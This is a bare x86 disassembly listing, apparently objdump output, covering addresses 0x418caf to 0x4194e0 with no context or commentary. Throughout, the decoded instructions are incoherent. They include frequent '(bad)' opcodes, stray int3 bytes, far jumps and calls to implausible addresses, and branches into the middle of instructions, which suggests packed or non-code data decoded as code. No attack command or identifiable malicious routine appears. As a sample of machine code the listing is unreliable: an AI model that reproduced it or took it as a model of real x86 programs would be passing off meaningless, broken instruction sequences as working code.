  418caf:	xchg   esp,eax
  418cb0:	inc    edx
  418cb1:	dec    DWORD PTR [ecx-0xc007c9c]
  418cb7:	xor    BYTE PTR [eax],al
  418cb9:	cmp    edi,0x64
  418cbc:	sub    ebx,DWORD PTR [ebp+0x5ef300]
  418cc2:	add    BYTE PTR [ebp-0x1],bh
  418cc5:	(bad)  
  418cc6:	cmp    al,0x23
  418cc8:	int3   
  418cc9:	add    DWORD PTR [ebx+0x381ba6],0x62
  418cd0:	sub    al,0x0
  418cd2:	add    BYTE PTR [eax-0x1],dh
  418cd5:	push   DWORD PTR [edx-0xff07]
  418cdb:	add    al,0xb7
  418cdd:	mov    ah,0x83
  418cdf:	adc    bl,BYTE PTR [ecx-0x7d]
  418ce2:	add    BYTE PTR [ebp-0x4e6a007d],al
  418ce8:	(bad)  
  418ce9:	inc    DWORD PTR [eax]
  418ceb:	mov    bl,0x85
  418ced:	add    BYTE PTR ds:[esi+ebx*2],dh
  418cf1:	add    BYTE PTR [eax],al
  418cf3:	and    eax,0x80c88300
  418cf8:	dec    esp
  418cfa:	(bad)  
  418cfb:	js     0x418c9c
  418cfd:	jmp    0x6800:0xaa1ff
  418d04:	int3   
  418d05:	add    BYTE PTR [edx-0x70],cl
  418d08:	int3   
  418d09:	(bad)  
  418d0a:	(bad)  
  418d0b:	cld    
  418d0c:	in     al,dx
  418d0d:	mov    al,BYTE PTR [ebx+0x9ff8]
  418d13:	loop   0x418d15
  418d15:	(bad)  
  418d16:	mov    esi,0x83ffff96
  418d1b:	ror    DWORD PTR [eax-0x67],1
  418d1e:	jmp    FWORD PTR [esi+0x16000069]
  418d24:	cmp    edi,0xffffff9c
  418d27:	in     al,0x89
  418d29:	(bad)  
  418d2a:	call   FWORD PTR [edi]
  418d2c:	add    ah,BYTE PTR [ebp-0x7c70c077]
  418d32:	jmp    FWORD PTR [eax]
  418d34:	inc    DWORD PTR [eax]
  418d36:	push   ebx
  418d37:	cmp    al,0x0
  418d39:	cmp    edi,0x63
  418d3c:	push   0xfffffff3
  418d3e:	inc    DWORD PTR [edi-0x6f]
  418d41:	inc    DWORD PTR [ebx+0x35ffff9b]
  418d47:	cdq    
  418d48:	(bad)  
  418d49:	inc    DWORD PTR [eax]
  418d4b:	mov    ds:0x90ff3639,al
  418d50:	push   es
  418d51:	add    DWORD PTR [eax],0x4c
  418d54:	(bad)  
  418d55:	inc    DWORD PTR [eax+0x5d]
  418d58:	mov    edi,edi
  418d5a:	(bad)  
  418d5b:	cmp    al,0x86
  418d5d:	jnp    0x418d5e
  418d5f:	mov    edi,ebx
  418d61:	add    BYTE PTR [eax],al
  418d63:	cmp    edi,edi
  418d65:	(bad)  
  418d66:	aas    
  418d67:	repz mov esp,ecx
  418d6a:	int3   
  418d6b:	clc    
  418d6c:	add    ebx,DWORD PTR [edx-0x34]
  418d6f:	out    dx,eax
  418d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d71:	inc    DWORD PTR [ebx+0x6ff00a7]
  418d77:	mov    edx,0x800ffff
  418d7c:	and    edi,eax
  418d7e:	add    BYTE PTR [ecx],al
  418d80:	int3   
  418d81:	(bad)  
  418d82:	jmp    ecx
  418d84:	mov    edi,edi
  418d86:	and    al,0x6e
  418d88:	(bad)  
  418d89:	(bad)  
  418d8a:	call   ecx
  418d8c:	jmp    0xffff:0x58e789b1
  418d93:	push   ebp
  418d94:	add    BYTE PTR [ebx-0x7c003f6e],al
  418d9a:	int3   
  418d9b:	fxch   st(2)
  418d9d:	mov    DWORD PTR [ebx+0xff1b5d],eax
  418da3:	test   al,0xcc
  418da5:	add    dh,bh
  418da7:	retf   
  418da8:	or     esp,0x0
  418dab:	add    al,0xef
  418dad:	cmp    al,0xff
  418daf:	sbb    edi,ebp
  418db1:	(bad)  
  418db2:	jmp    FWORD PTR [eax+0x3378ffff]
  418db8:	inc    DWORD PTR [eax]
  418dba:	(bad)  
  418dbb:	sti    
  418dbc:	sbb    eax,0x817a8386
  418dc1:	add    bh,bh
  418dc3:	nop
  418dc4:	add    ah,cl
  418dc6:	loope  0x418d75
  418dc8:	inc    DWORD PTR [eax]
  418dca:	(bad)  
  418dcb:	mov    ebx,0x2f895e90
  418dd0:	rol    DWORD PTR [eax],cl
  418dd2:	jmp    ebx
  418dd4:	mov    DWORD PTR [eax],eax
  418dd6:	mov    al,0x32
  418dd8:	(bad)  
  418dd9:	inc    DWORD PTR [eax]
  418ddb:	xor    dl,BYTE PTR [edi-0x79]
  418dde:	int3   
  418ddf:	fpatan 
  418de1:	dec    DWORD PTR [ecx-0x587c0053]
  418de7:	enter  0xffff,0xff
  418deb:	call   0x8c:0xa1ff76fa
  418df2:	call   FWORD PTR [edi]
  418df4:	add    BYTE PTR [eax],al
  418df6:	packssdw mm7,mm7
  418df9:	inc    DWORD PTR [eax]
  418dfb:	pusha  
  418dfc:	js     0x418e5b
  418dfe:	add    BYTE PTR ds:0x65ffff65,dh
  418e04:	(bad)  
  418e05:	dec    DWORD PTR [ecx+0x52]
  418e08:	cmp    edi,0xffffffcc
  418e0b:	cmp    BYTE PTR [ebx+eiz*8+0x0],0xe
  418e10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e11:	(bad)  
  418e12:	call   FWORD PTR [esi]
  418e14:	mov    DWORD PTR [ecx-0xff64d7],ecx
  418e1a:	cmp    DWORD PTR [esi+edi*1],0x15
  418e1e:	inc    DWORD PTR [eax+esi*2-0x77]
  418e22:	add    cl,ah
  418e24:	(bad)  
  418e25:	push   DWORD PTR [edi+0xffffdb]
  418e2b:	or     ebp,esp
  418e2d:	mov    ds:0x898fa300,eax
  418e32:	call   DWORD PTR [ecx-0x77]
  418e35:	int3   
  418e36:	cmc    
  418e37:	jecxz  0x418e39
  418e39:	inc    DWORD PTR [eax]
  418e3b:	xor    DWORD PTR [ebp+0x37],eax
  418e3e:	xor    DWORD PTR [edx],0x35
  418e41:	dec    esp
  418e43:	mov    ebp,0xf5e00083
  418e48:	mov    edi,edi
  418e4a:	inc    DWORD PTR [esi]
  418e4c:	push   ss
  418e4d:	dec    edi
  418e4e:	add    BYTE PTR [ebx],cl
  418e50:	fdiv   st(7),st
  418e52:	int3   
  418e53:	fs add bh,bh
  418e56:	inc    esp
  418e57:	fmul   DWORD PTR [ecx+0x592f8383]
  418e5d:	out    0x0,al
  418e5f:	push   esp
  418e60:	sbb    eax,0x89830000
  418e65:	push   DWORD PTR [ecx+0xa]
  418e68:	add    BYTE PTR [ebx-0x774f5301],al
  418e6e:	add    BYTE PTR [ecx-0x1a00ff0c],dh
  418e74:	(bad)  
  418e75:	jmp    DWORD PTR [ecx+edi*1-0x1]
  418e79:	add    DWORD PTR [eax],0x6
  418e7c:	mov    ds:0x809d83ac,eax
  418e81:	dec    esp
  418e83:	ins    DWORD PTR es:[edi],dx
  418e84:	(bad)  
  418e85:	inc    DWORD PTR [ecx+0xffff4d]
  418e8b:	int3   
  418e8c:	fstp   DWORD PTR [edi+edi*8-0x4ad1]
  418e93:	int3   
  418e94:	add    BYTE PTR [eax],al
  418e96:	loop   0x418e3b
  418e98:	inc    DWORD PTR [eax]
  418e9a:	inc    DWORD PTR [edi+0x33]
  418e9d:	jne    0x418e6b
  418e9f:	pushf  
  418ea0:	sub    bh,bh
  418ea2:	sbb    DWORD PTR [ebp+0x0],0xffffff83
  418ea6:	jmp    0xaf7a:0xff89ac
  418ead:	(bad)  
  418eae:	call   FWORD PTR [eax-0x41ff007b]
  418eb4:	(bad)  
  418eb5:	call   ecx
  418eb7:	xchg   edx,eax
  418eb8:	dec    esp
  418eba:	cmp    esp,0x58
  418ebd:	nop
  418ebe:	(bad)  
  418ebf:	mov    eax,0xe7ffffe7
  418ec4:	add    DWORD PTR [ebx+0xff64ab],0x0
  418ecb:	rcr    DWORD PTR ds:0x8b96ffd5,1
  418ed1:	inc    DWORD PTR [eax]
  418ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed4:	int3   
  418ed5:	int3   
  418ed6:	jge    0x418ee4
  418ed8:	int3   
  418ed9:	cmp    edi,0xffffffcd
  418edc:	idiv   DWORD PTR [ecx]
  418ede:	add    BYTE PTR [edx-0x22000074],bh
  418ee4:	int3   
  418ee5:	add    BYTE PTR [ebx+0x26],ah
  418ee8:	(bad)  
  418ee9:	(bad)  
  418eea:	dec    DWORD PTR [ebp-0xe7c1c67]
  418ef0:	sbb    DWORD PTR [eax],eax
  418ef2:	add    BYTE PTR [esi-0x4a080001],al
  418ef8:	dec    DWORD PTR [ecx-0x41edb300]
  418efe:	jmp    DWORD PTR [edi-0x3d0000c9]
  418f04:	add    bh,bh
  418f06:	cs pop ecx
  418f08:	inc    DWORD PTR [eax]
  418f0a:	call   DWORD PTR [ecx]
  418f0c:	pop    edx
  418f0d:	(bad)  
  418f0e:	push   DWORD PTR [eax-0x267c006e]
  418f14:	inc    DWORD PTR [eax]
  418f16:	fs data16 add bh,bh
  418f1a:	add    BYTE PTR [ebp-0x17c851c],ch
  418f20:	pushf  
  418f21:	or     esp,0x2
  418f24:	int3   
  418f25:	jmp    FWORD PTR [esi-0xff00a8]
  418f2b:	loope  0x418f10
  418f2d:	mov    al,0x0
  418f2f:	into   
  418f30:	ja     0x418f31
  418f32:	jmp    FWORD PTR ds:0x42200cc
  418f38:	mov    DWORD PTR [eax],eax
  418f3a:	int3   
  418f3b:	and    dl,BYTE PTR [ebx]
  418f3d:	add    BYTE PTR gs:[eax-0x437c0085],ah
  418f44:	dec    DWORD PTR [ecx+0x895b8d]
  418f4a:	add    BYTE PTR [edx],bh
  418f4c:	cmp    dl,BYTE PTR [edx]
  418f4e:	jmp    FWORD PTR [eax+esi*1-0x7c0d0001]
  418f55:	xor    DWORD PTR [ebp+0xff05],0x3
  418f5c:	in     eax,dx
  418f5d:	xchg   BYTE PTR [ebx-0x7c336dcb],al
  418f63:	mov    ecx,0x92190000
  418f68:	int3   
  418f69:	add    BYTE PTR [ebx-0x48a097],al
  418f6f:	mov    fs,WORD PTR [edx-0x34]
  418f72:	dec    DWORD PTR [ecx-0x77]
  418f75:	int3   
  418f76:	mov    bh,0x3
  418f78:	inc    DWORD PTR [eax]
  418f7a:	add    BYTE PTR [eax],al
  418f7c:	pop    edi
  418f7d:	cmc    
  418f7e:	dec    DWORD PTR [ebx]
  418f80:	add    DWORD PTR [ebx-0x7c006b00],eax
  418f86:	push   esi
  418f87:	aam    0xff
  418f89:	cmp    edi,0xffffff96
  418f8c:	jns    0x418f5a
  418f8e:	mov    DWORD PTR [ecx],edi
  418f90:	test   ah,0xff
  418f93:	repz add BYTE PTR [eax],al
  418f96:	fidiv  WORD PTR [eax-0x5676ff77]
  418f9c:	xchg   ebp,eax
  418f9d:	or     eax,0xff620aff
  418fa2:	call   edx
  418fa4:	int3   
  418fa5:	call   edx
  418fa7:	ud0    edi,edi
  418faa:	push   DWORD PTR [ecx]
  418fac:	push   esp
  418fad:	push   esi
  418fae:	call   DWORD PTR ds:0x4000ff7f
  418fb4:	(bad)  
  418fb5:	(bad)  
  418fb6:	fsubp  st(6),st
  418fb8:	(bad)  
  418fb9:	inc    DWORD PTR [eax]
  418fbb:	sti    
  418fbc:	psubsw mm7,mm7
  418fbf:	add    DWORD PTR [esi-0x1],0xffffffff
  418fc3:	lods   eax,DWORD PTR ds:[esi]
  418fc4:	int3   
  418fc5:	cmp    DWORD PTR [ebp-0xffa8],0x46
  418fcc:	(bad)  
  418fcd:	pop    ds
  418fce:	add    BYTE PTR [ecx-0x56],ah
  418fd1:	add    DWORD PTR [eax],0xffffffde
  418fd4:	add    bh,bh
  418fd6:	and    BYTE PTR [esi],bh
  418fd8:	add    BYTE PTR [ebx-0x30c2cf01],al
  418fde:	jmp    DWORD PTR [edi-0xb]
  418fe1:	cmp    edi,0x3d
  418fe4:	inc    DWORD PTR [ebx+0xffc97f]
  418fea:	jmp    FWORD PTR ds:0xb400bc9d
  418ff0:	mov    ch,0x0
  418ff2:	add    BYTE PTR [edx-0x77],ah
  418ff5:	jmp    DWORD PTR [esi]
  418ff7:	(bad)  
  418ff8:	dec    DWORD PTR [ecx+0x7b20d7ff]
  418ffe:	push   DWORD PTR [eax-0x400ffe9]
  419004:	inc    DWORD PTR [eax]
  419006:	(bad)  
  419007:	push   esp
  419008:	add    BYTE PTR [eax],al
  41900a:	int3   
  41900b:	pop    ecx
  41900c:	jne    0x418f97
  41900e:	add    BYTE PTR [eax],cl
  419010:	sahf   
  419011:	inc    DWORD PTR [ebx-0x40000bb]
  419017:	push   esp
  419018:	(bad)  
  419019:	(bad)  
  41901a:	call   FWORD PTR [esi+0x6bcc1a1f]
  419020:	add    edi,edi
  419022:	add    BYTE PTR [ebx+0x24818383],al
  419028:	int3   
  419029:	(bad)  
  41902a:	(bad)  
  41902b:	cmp    ch,BYTE PTR [edx]
  41902d:	inc    eax
  41902e:	dec    DWORD PTR [edx]
  419030:	out    0xff,eax
  419032:	adc    DWORD PTR [edi],0x0
  419035:	or     DWORD PTR [ecx+ecx*1+0x5783ff00],0xffffff8d
  41903d:	out    0xff,al
  41903f:	pop    ebp
  419040:	add    BYTE PTR fs:[eax],al
  419043:	call   0x75431948
  419048:	int3   
  419049:	add    BYTE PTR [ecx-0xe7cc43],cl
  41904f:	push   ds
  419050:	loop   0x419052
  419052:	add    BYTE PTR [ecx-0x43a10034],bl
  419058:	(bad)  
  419059:	(bad)  
  41905a:	dec    DWORD PTR [edi+0x2a008530]
  419060:	push   esp
  419061:	(bad)  
  419062:	dec    ebx
  419064:	add    bh,bh
  419066:	sbb    bl,BYTE PTR [esi+0x4bff0000]
  41906c:	cli    
  41906d:	mov    ecx,0xe82cff
  419072:	jmp    edi
  419074:	inc    DWORD PTR [eax]
  419076:	imul   ebp,DWORD PTR [esi],0xffffffff
  419079:	add    bh,bh
  41907b:	clc    
  41907c:	or     BYTE PTR ds:0xff557bff,bh
  419082:	and    DWORD PTR [ebx-0x34],0xffffffff
  419086:	pop    esi
  419087:	or     al,0xff
  419089:	inc    DWORD PTR [eax]
  41908b:	or     al,0xe6
  41908d:	cli    
  41908e:	mov    DWORD PTR [ebx],edx
  419090:	inc    esi
  419091:	add    BYTE PTR [ebx+0x5a830023],al
  419097:	mov    dh,0x0
  419099:	add    BYTE PTR [eax],al
  41909b:	ficom  DWORD PTR [ebx-0x615b00c4]
  4190a1:	add    BYTE PTR [ebx-0x7f003384],al
  4190a7:	push   esi
  4190a8:	(bad)  
  4190a9:	(bad)  
  4190aa:	(bad)  
  4190ab:	mov    edx,0x3100a8d1
  4190b0:	mov    edx,0xffed8300
  4190b5:	add    BYTE PTR [eax+0x72],cl
  4190b8:	add    bh,bh
  4190ba:	call   FWORD PTR [eax]
  4190bc:	inc    edx
  4190bd:	mov    BYTE PTR [eax],0x57
  4190c0:	ds add ah,cl
  4190c3:	adc    edi,edi
  4190c5:	cmp    DWORD PTR [esi+0xffff43],0xffffffa7
  4190cc:	leave  
  4190cd:	loope  0x4190cf
  4190cf:	fsubr  QWORD PTR [edi-0x2007d]
  4190d5:	adc    DWORD PTR [ecx+0x1c],0xffffffff
  4190d9:	add    BYTE PTR [eax],al
  4190db:	or     ebx,DWORD PTR [ecx+0x5f3683e5]
  4190e1:	inc    DWORD PTR [eax]
  4190e3:	aad    0xff
  4190e5:	dec    DWORD PTR [edi-0x73]
  4190e8:	(bad)  
  4190e9:	inc    DWORD PTR [eax]
  4190eb:	icebp  
  4190ec:	pop    ss
  4190ed:	fiadd  WORD PTR [eax]
  4190ef:	ins    BYTE PTR es:[edi],dx
  4190f0:	lea    eax,[eax]
  4190f2:	add    ah,bl
  4190f4:	dec    esp
  4190f6:	sbb    ecx,DWORD PTR fs:[ecx-0x5a3aff01]
  4190fd:	and    edi,edi
  4190ff:	aas    
  419100:	mov    eax,ds:0xca0000
  419105:	(bad)  
  419106:	mov    ecx,0x2e
  41910b:	les    esi,FWORD PTR [edx-0x44]
  41910e:	(bad)  
  41910f:	aas    
  419110:	sub    eax,DWORD PTR [eax]
  419112:	xor    DWORD PTR [ecx-0x7080000],0xffffff83
  419119:	add    BYTE PTR [ecx+0x60a328],cl
  41911f:	sti    
  419120:	in     eax,dx
  419121:	(bad)  
  419122:	(bad)  
  419123:	std    
  419124:	inc    DWORD PTR [eax]
  419126:	inc    esi
  419127:	inc    eax
  419128:	add    bh,bh
  41912a:	add    BYTE PTR [edx+0x2cffbe4b],ah
  419130:	stos   DWORD PTR es:[edi],eax
  419131:	add    BYTE PTR [eax],al
  419133:	loop   0x419134
  419135:	mov    DWORD PTR [ecx-0x70],esi
  419138:	add    bh,bh
  41913a:	add    ecx,0xffffff86
  41913d:	repnz dec DWORD PTR [ebp+0x56ffff61]
  419144:	add    bh,bh
  419146:	xor    eax,0xcc00ff64
  41914b:	pushf  
  41914c:	pop    ss
  41914d:	imul   eax,DWORD PTR [ebx-0x33ffe23d],0xffffc7
  419157:	mov    edx,0x1affffff
  41915c:	sub    esp,DWORD PTR [esi]
  41915e:	push   DWORD PTR [ecx]
  419160:	mov    ah,0x0
  419162:	add    BYTE PTR [ebx-0x62da7d00],dl
  419168:	(bad)  
  419169:	inc    DWORD PTR [eax]
  41916b:	sub    ebx,esp
  41916d:	inc    edx
  41916e:	call   FWORD PTR [eax+0x70008925]
  419174:	inc    DWORD PTR [eax]
  419176:	xchg   esi,eax
  419177:	sbb    al,BYTE PTR [eax]
  419179:	inc    DWORD PTR [ebx+0x2a21dc]
  41917f:	xor    eax,0x168900df
  419184:	add    BYTE PTR [eax],al
  419186:	xchg   ecx,eax
  419187:	lahf   
  419188:	add    BYTE PTR [eax],al
  41918a:	add    BYTE PTR [eax+ebx*8],bh
  41918d:	inc    ecx
  41918e:	(bad)  
  41918f:	mov    ecx,0xa00000d4
  419194:	inc    DWORD PTR [eax]
  419196:	jmp    0x10e1ae6
  41919b:	(bad)  
  41919c:	int3   
  41919d:	cmp    bh,0xc1
  4191a0:	push   cs
  4191a1:	inc    DWORD PTR [eax]
  4191a3:	leave  
  4191a4:	(bad)  
  4191a5:	call   FWORD PTR [edx-0x41]
  4191a8:	add    BYTE PTR [eax],al
  4191aa:	push   esp
  4191ac:	inc    edx
  4191ad:	fild   WORD PTR [eax]
  4191af:	xor    edx,0xff968389
  4191b5:	(bad)  
  4191b6:	mov    ebx,0x83ffffdc
  4191bb:	cmp    ebp,DWORD PTR [edi]
  4191bd:	pop    edi
  4191be:	inc    esp
  4191c0:	add    bh,bh
  4191c2:	jmp    edx
  4191c4:	int3   
  4191c5:	or     DWORD PTR [esi+0x65],0xffffffff
  4191c9:	int3   
  4191ca:	push   DWORD PTR ds:0x5d8945ce
  4191d0:	jmp    0x791d5
  4191d5:	sub    DWORD PTR [edi+0x26],0xffffffff
  4191d9:	add    ah,cl
  4191db:	stc    
  4191dc:	and    DWORD PTR [edx-0x76675d77],edx
  4191e2:	inc    eax
  4191e4:	(bad)  
  4191e5:	dec    DWORD PTR [edx]
  4191e7:	jp     0x4191b5
  4191e9:	inc    DWORD PTR [ebx+0xffbcc3]
  4191ef:	jge    0x419252
  4191f1:	add    bh,bh
  4191f3:	in     eax,0x0
  4191f5:	dec    DWORD PTR [ebp-0x77]
  4191fb:	aam    0xd6
  4191fd:	mov    ?,edi
  4191ff:	adc    al,0x92
  419201:	(bad)  
  419202:	dec    DWORD PTR [eax-0x8730100]
  419208:	(bad)  
  419209:	(bad)  
  41920a:	push   ecx
  41920c:	dec    ebx
  41920d:	ins    BYTE PTR es:[edi],dx
  41920e:	int3   
  41920f:	mov    ebp,DWORD PTR [edx-0x7c97007d]
  419215:	add    ch,cl
  419217:	mov    edi,0x29ff0000
  41921c:	(bad)  
  41921e:	(bad)  
  41921f:	jmp    0x4191c3
  419221:	add    bh,bh
  419223:	mov    ds:0x82010000,eax
  419228:	inc    DWORD PTR [eax]
  41922a:	or     DWORD PTR [ebp+0x2789cddb],0xffffffb6
  419231:	(bad)  
  419232:	dec    DWORD PTR [ebx-0x1]
  419235:	(bad)  
  419236:	mov    ebp,0x89ff00bf
  41923b:	mov    dl,BYTE PTR [ebx+edx*2+0x468583]
  419242:	jmp    FWORD PTR [ebx+eax*4]
  419245:	dec    DWORD PTR [eax]
  419247:	cs (bad) 
  419249:	inc    DWORD PTR [eax]
  41924b:	inc    esp
  41924c:	mov    al,ds:0xe6bfffae
  419251:	add    bh,bh
  419253:	adc    al,BYTE PTR [eax]
  419255:	add    BYTE PTR [ebp+0x25],dl
  419258:	inc    DWORD PTR [eax]
  41925a:	add    bl,ch
  41925c:	in     eax,dx
  41925d:	mov    eax,ds:0xff18bc89
  419262:	push   DWORD PTR [ecx-0x2ff6ff7d]
  419268:	mov    edi,edi
  41926a:	add    BYTE PTR [esi+esi*1],dl
  41926d:	sbb    edi,edi
  41926f:	pushf  
  419270:	push   0xffffff89
  419272:	push   DWORD PTR [eax+0x0]
  419275:	call   FWORD PTR [eax+0x3d]
  419278:	dec    DWORD PTR [ecx-0x6c7a7a77]
  41927e:	push   DWORD PTR [ecx-0x1c7c7622]
  419284:	add    DWORD PTR [eax],0xfffffff3
  419287:	inc    esi
  419288:	mov    edi,edi
  41928a:	cmp    DWORD PTR [ebx+edx*4],0x3d
  41928e:	add    BYTE PTR [ecx+0x6eff00e2],cl
  419294:	(bad)  
  419295:	(bad)  
  419296:	ds inc ebx
  419298:	add    BYTE PTR [eax],al
  41929a:	int3   
  41929b:	ins    DWORD PTR es:[edi],dx
  41929c:	or     DWORD PTR [ebp+0xf49583],0xff00bdff
  4192a6:	(bad)  
  4192a7:	mov    al,ds:0xaa8983ff
  4192ac:	in     eax,dx
  4192ad:	cs inc ebx
  4192b0:	add    BYTE PTR fs:[ebx+0x400ff35],al
  4192b7:	or     bh,bh
  4192b9:	inc    DWORD PTR [ebx+0x9dfed8]
  4192bf:	loope  0x419249
  4192c1:	add    DWORD PTR [eax],0x2d
  4192c4:	inc    DWORD PTR [ebx+0xff5d6b]
  4192ca:	add    edx,0x3f
  4192cd:	push   es
  4192ce:	or     DWORD PTR [eax+eax*2+0x0],0xffffffcc
  4192d3:	jne    0x4192d4
  4192d5:	jmp    FWORD PTR [edx-0x3300ff39]
  4192db:	fst    st(2)
  4192dd:	inc    ebx
  4192de:	add    dl,ch
  4192e0:	pop    edx
  4192e1:	add    BYTE PTR [eax],al
  4192e3:	call   0x90b116e7
  4192e8:	add    BYTE PTR [ecx-0x7a233177],cl
  4192ee:	(bad)  
  4192ef:	cmp    al,0x57
  4192f1:	add    BYTE PTR [ebx-0x2433ff95],al
  4192f7:	repnz add BYTE PTR [ebx+0x457469ff],al
  4192fe:	add    BYTE PTR [eax-0x20],cl
  419301:	(bad)  
  419302:	inc    DWORD PTR [ebp-0x1]
  419305:	push   ebx
  419307:	ds cmp edi,0xffffffff
  41930b:	fdiv   QWORD PTR [edx+0x4f53000d]
  419311:	mov    edi,edi
  419313:	inc    ebp
  419314:	add    ah,cl
  419316:	jno    0x4192e7
  419318:	int3   
  419319:	inc    DWORD PTR [eax]
  41931b:	fsub   DWORD PTR [edx]
  41931d:	pusha  
  41931e:	int3   
  41931f:	cmp    dh,BYTE PTR [ebx-0x1]
  419322:	call   DWORD PTR [edx-0x77]
  419325:	(bad)  
  419326:	in     al,dx
  419327:	cld    
  419328:	(bad)  
  419329:	dec    esp
  41932b:	dec    edi
  41932c:	jnp    0x41931f
  41932e:	sub    ecx,0xffffffd1
  419331:	add    BYTE PTR [ecx+0x7900ff09],cl
  419337:	mov    al,ds:0xfa0000ff
  41933c:	aam    0xe5
  41933e:	jmp    FWORD PTR [ecx+0x6b]
  419341:	mov    DWORD PTR [ecx+0x7aff0084],ecx
  419347:	ja     0x4192d2
  419349:	add    DWORD PTR [eax],0xffffffc9
  41934c:	cld    
  41934d:	inc    ebx
  41934e:	jmp    DWORD PTR [ecx]
  419350:	jmp    0xcc619454
  419355:	(bad)  
  419356:	cmp    edx,DWORD PTR [eax-0x1]
  419359:	cmp    edi,0x11
  41935c:	pop    eax
  41935d:	mov    eax,DWORD PTR [eax]
  41935f:	adc    BYTE PTR [ebp-0x1],ah
  419362:	mov    DWORD PTR [esi-0x5d917700],edi
  419368:	dec    DWORD PTR [ecx+0x1bb73200]
  41936e:	sub    DWORD PTR [edi+0x28ffff4e],0xffffffff
  419375:	add    ah,bh
  419377:	outs   dx,BYTE PTR ds:[esi]
  419378:	mov    DWORD PTR [eax],eax
  41937a:	or     DWORD PTR [edx-0x1f33f5e1],0xd
  419381:	int3   
  419382:	add    BYTE PTR [ecx-0x1],ah
  419385:	call   FWORD PTR [edx-0x89]
  41938b:	call   0xfff3:0xfcffead4
  419392:	add    BYTE PTR [ebx],dh
  419394:	add    bh,bh
  419396:	jecxz  0x4193a6
  419398:	add    DWORD PTR [eax],0xffffff83
  41939b:	call   0xf8420bdd
  4193a0:	pop    eax
  4193a1:	(bad)  
  4193a2:	(bad)  
  4193a3:	cmp    al,BYTE PTR [eax]
  4193a5:	add    BYTE PTR [esi+edx*2-0x1],dl
  4193a9:	add    bh,bh
  4193ab:	(bad)  
  4193ac:	ror    BYTE PTR [edi-0x132500],cl
  4193b2:	push   DWORD PTR ds:0x17ac00cc
  4193b8:	add    BYTE PTR [eax],al
  4193ba:	jmp    DWORD PTR [ebx-0x28]
  4193bd:	aad    0xff
  4193bf:	push   ecx
  4193c0:	xor    al,BYTE PTR [eax]
  4193c2:	mov    DWORD PTR [ecx+0x46ffff00],edi
  4193c8:	add    DWORD PTR [eax],0xffffffff
  4193cb:	push   esp
  4193cc:	push   eax
  4193cd:	sub    DWORD PTR [ebx-0x49cb],eax
  4193d3:	loop   0x419358
  4193d5:	and    DWORD PTR [esi-0x39],0xffffff89
  4193d9:	inc    DWORD PTR [eax]
  4193db:	leave  
  4193dc:	adc    eax,0x308e006f
  4193e1:	inc    DWORD PTR [ebx-0x7f00002f]
  4193e7:	pop    edx
  4193e8:	mov    DWORD PTR [ebx+0x23e9d000],eax
  4193ee:	add    BYTE PTR [ecx],al
  4193f0:	rol    DWORD PTR [ebx-0xff7b00],1
  4193f6:	mov    ecx,0xff831c
  4193fb:	cmp    dh,dl
  4193fd:	ret    0xfe00
  419400:	pop    ecx
  419401:	int3   
  419402:	add    BYTE PTR [edi+0x0],ah
  419405:	dec    ecx
  419407:	test   bh,bh
  419409:	(bad)  
  41940a:	jmp    esi
  41940c:	cmp    BYTE PTR [edi+0x0],ah
  41940f:	popa   
  419410:	jg     0x419411
  419412:	jmp    DWORD PTR [edi]
  419414:	add    BYTE PTR [ebx+0x83b2ed],al
  41941a:	add    BYTE PTR [ecx],ch
  41941c:	pop    esp
  41941d:	test   BYTE PTR [eax],al
  41941f:	js     0x4193e3
  419421:	mov    DWORD PTR [eax],eax
  419423:	mov    edx,0x1c800ff
  419428:	inc    DWORD PTR [eax]
  41942a:	add    BYTE PTR [edx-0x3f],bl
  41942d:	cld    
  41942e:	dec    DWORD PTR [edx]
  419430:	inc    edx
  419431:	add    BYTE PTR [ebx+0x6f89ffd6],al
  419437:	sub    al,0x0
  419439:	add    ah,cl
  41943b:	push   ecx
  41943c:	adc    ch,BYTE PTR [ecx-0x1]
  41943f:	add    BYTE PTR [ebx],cl
  419441:	inc    DWORD PTR [ebx-0xcff7cf6]
  419447:	fdivp  st(7),st
  419449:	dec    DWORD PTR [ecx+0xb5147c]
  41944f:	(bad)  
  419450:	adc    eax,0xcc5e0083
  419455:	(bad)  
  419456:	call   0x411d83
  41945b:	rol    BYTE PTR [ebx+0x2b],cl
  41945e:	add    BYTE PTR [ebp+eiz*8+0xc1ffff],dh
  419465:	push   DWORD PTR [ecx+0xffff49]
  41946b:	mov    dl,0xed
  41946d:	jo     0x4193f8
  41946f:	fidiv  DWORD PTR [eax-0x740077]
  419475:	add    BYTE PTR [ebp+0x22],al
  419478:	add    DWORD PTR [eax],0xffffffff
  41947b:	fucomp st(5)
  41947d:	sahf   
  41947e:	push   esp
  419480:	aam    0xff
  419482:	add    BYTE PTR [edx+0x0],dl
  419485:	add    BYTE PTR [edx+0x75],bh
  419488:	add    DWORD PTR [eax],0xffffffff
  41948b:	adc    al,0x81
  41948d:	jae    0x419418
  41948f:	inc    ebx
  419490:	into   
  419491:	dec    esp
  419493:	(bad)  
  419494:	(bad)  
  419495:	dec    DWORD PTR [ebp+0x13]
  419498:	add    BYTE PTR [eax],al
  41949a:	(bad)  
  41949b:	cmp    BYTE PTR [ebx],ch
  41949d:	daa    
  41949e:	sbb    esp,0xffffffac
  4194a1:	inc    DWORD PTR [ebx-0x480000e0]
  4194a7:	mov    ebx,0x600ccff
  4194ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194ae:	mov    ecx,esi
  4194b0:	(bad)  
  4194b1:	int3   
  4194b2:	add    BYTE PTR [eax-0x1],bl
  4194b5:	dec    eax
  4194b7:	cmc    
  4194b8:	add    BYTE PTR [eax],al
  4194ba:	(bad)  
  4194bb:	fisubr DWORD PTR [eax-0x1a]
  4194be:	sbb    ebp,0xffffff97
  4194c1:	add    BYTE PTR [eax],al
  4194c3:	inc    ecx
  4194c4:	inc    DWORD PTR [eax]
  4194c6:	jne    0x4194fc
  4194c8:	(bad)  
  4194c9:	(bad)  
  4194ca:	(bad)  
  4194cb:	call   0xb7caf498
  4194d0:	lock inc DWORD PTR [eax]
  4194d3:	stos   DWORD PTR es:[edi],eax
  4194d4:	mov    DWORD PTR [eax],eax
  4194d6:	dec    esi
  4194d7:	cs (bad) 
  4194d9:	(bad)  
  4194da:	push   DWORD PTR [eax-0x59]
  4194dd:	popf   
  4194de:	int3   
  4194df:	hlt    
  4194e0:	iret   
